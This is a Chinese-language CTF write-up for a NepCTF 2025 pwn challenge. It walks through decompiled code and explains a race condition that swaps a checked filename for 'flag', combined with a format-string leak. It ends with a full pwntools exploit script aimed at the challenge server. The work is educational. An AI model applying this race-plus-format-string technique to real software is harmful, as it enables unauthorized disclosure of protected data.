---
title: "Write-ups: NepCTF 2025"
published: 2025-09-20
updated: 2025-09-20
description: "Write-ups for NepCTF 2025 pwn aspect."
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# Time

## Information

- Category: Pwn
- Points: Unknown

## Description

> Unknown

## Write-up

当时直接被别的 pwn 题吓跑了，感觉一道也做不出来……今天来复现一下这道 race condition 的题。没看 wp 自己做出来了，草啊，为啥当时不去试试别的题呢？

其实我没学过 race condition，但是因为看过 CSAPP，所以也知道个大概 ba，下面写一下思路。

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  pthread_t newthread[2]; // [rsp+0h] [rbp-10h] BYREF

  newthread[1] = __readfsqword(0x28u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  get_name();
  while ( 1 )
  {
    while ( !(unsigned int)get_filename() )
      ;
    pthread_create(newthread, 0, (void *(*)(void *))start_routine, 0);
  }
}
```

首先是这个 `get_name` 函数，里面先获取了用户名，保存到 bss 中的 `format_0`。然后 fork 出来一个子进程，执行 `/bin/ls / -al`，并在回收子进程后返回到 main 。

```c
unsigned __int64 get_name()
{
  char *argv[5]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("please input your name:");
  __isoc99_scanf("%100s", format_0);
  puts("I will tell you all file names in the current directory!");
  argv[0] = "/bin/ls";
  argv[1] = "/";
  argv[2] = "-al";
  argv[3] = 0;
  if ( !fork() )
    execve("/bin/ls", argv, 0);
  wait(0);
  puts("good luck :-)");
  return v2 - __readfsqword(0x28u);
}
```

返回后进入 main 中的无限循环，先调用了 `get_filename` 函数，读取到的文件名保存在 bss 中的 `file` 这个位置，然后判断输入的文件名是否为 flag，如果是 flag 就返回 0，接着返回到 main 重新运行这个函数。所以为了让它继续往下执行，我们这里不能直接输入 flag 。

```c
__int64 get_filename()
{
  puts("input file name you want to read:");
  __isoc99_scanf("%s", file);
  if ( !strstr(file, "flag") )
    return 1;
  puts("flag is not allowed!");
  return 0;
}
```

往下看，有个创建子线程的 `pthread_create` 调用，它会创建一个子线程执行 `start_routine`。根据运行测试 plus 逻辑分析，我们知道这个函数中调用的其它不知名功能应该就是用来计算 md5 的。细节我们不去管它，直接看宏观逻辑的话，应该是计算好 md5 后逐字节输出，然后清空 buf 用于保存后面 open 打开的文件的内容。之后有个格式化字符串漏洞，使用的格式化字符串是我们一开始在 get_name 中输入的内容。

```c
unsigned __int64 __fastcall start_routine(void *a1)
{
  unsigned int n; // eax
  int i; // [rsp+4h] [rbp-46Ch]
  int j; // [rsp+8h] [rbp-468h]
  int fd; // [rsp+Ch] [rbp-464h]
  _DWORD v6[24]; // [rsp+10h] [rbp-460h] BYREF
  _BYTE v7[16]; // [rsp+70h] [rbp-400h] BYREF
  _BYTE buf[1000]; // [rsp+80h] [rbp-3F0h] BYREF
  unsigned __int64 v9; // [rsp+468h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  sub_1329(v6);
  n = strlen(file);
  sub_1379(v6, file, n);
  sub_14CB(v6, (__int64)v7);
  puts("I will tell you last file name content in md5:");
  for ( i = 0; i <= 15; ++i )
    printf("%02X", (unsigned __int8)v7[i]);
  putchar(0xA);
  for ( j = 0; j <= 999; ++j )
    buf[j] = 0;
  fd = open(file, 0);
  if ( fd >= 0 )
  {
    read(fd, buf, 0x3E8u);
    close(fd);
    printf("hello ");
    printf(format_0);
    puts(" ,your file read done!");
  }
  else
  {
    puts("file not found!");
  }
  return v9 - __readfsqword(0x28u);
}
```

这题的思路就是，首先让它获取一个非 flag 的文件名，如此我们才能够创建子线程调用 `start_routine`。而解题的关键在于这里执行子进程和执行父进程之间存在一个 race condition 。

由于程序是并发执行的，运行一段时间主线程就会运行一段时间子线程，而主线程和子线程到底是哪个先运行，这是无法预测的。可能先跑子线程，跑完跑主线程，也可能先跑主线程，然后跑子线程……假设我们就是先跑了主线程，那我们就又回到了 `get_filename`，我们就可以输入 `flag`，覆盖原先为了创建子线程而使用的其它文件名，而由于输入是直接用 scanf 写到 bss 的，所以后面那个检测是不是 flag 的判断我们可以直接忽视。这样一来，我们再去执行子线程的时候 open 打开的就是 flag 了。

那我们怎么知道它一定会先跑一会儿主线程呢？这涉及了一些更底层的知识，我个人的理解是，由于现代计算机中的程序都是并发运行的，而每个线程都有一个固定的很短的执行周期，一旦这个执行周期耗尽，就会切换到另一个进程去执行，然后切换回来，继续执行刚才被切走的线程，如此反复……由于子线程中计算 md5 的时候调用的函数会占用大量的时钟周期，所以说如果我们现在在执行子线程，那在需要如此多时钟周期 + 如此短的并发周期内，它肯定不可能完成子线程的执行，也就是说必然会中途暂停了去执行主线程。那自然就可以推导出我们必然可以覆盖文件名的内容，让子线程打开我们想要打开的文件……

OK，现在我们知道怎么把 flag 读到内存中了，结合后面那个格式化字符串漏洞，我们就可以泄漏出内存中的 flag，非常简单。没想到我的第一道 race condition challenge 就这样挑战成功了。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    flat,
    process,
    raw_input,
    remote,
)


FILE = "./patched"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    payload = flat(
        b"%22$p-%23$p",
    )
    raw_input("DEBUG")
    target.sendlineafter(b"name:", payload)
    target.sendline(b"aaaa")
    target.sendline(b"flag")
    target.recvuntil(b"hello ")

    resp = target.recvuntil(b" ,").split(b"-")
    flag_p1 = bytes.fromhex(resp[0].decode()[2:])[::-1].decode()
    flag_p2 = bytes.fromhex("0" + resp[1].decode()[2:-2])[::-1].decode()
    flag = flag_p1 + flag_p2
    target.success(flag)

    target.interactive()


if __name__ == "__main__":
    main()
```
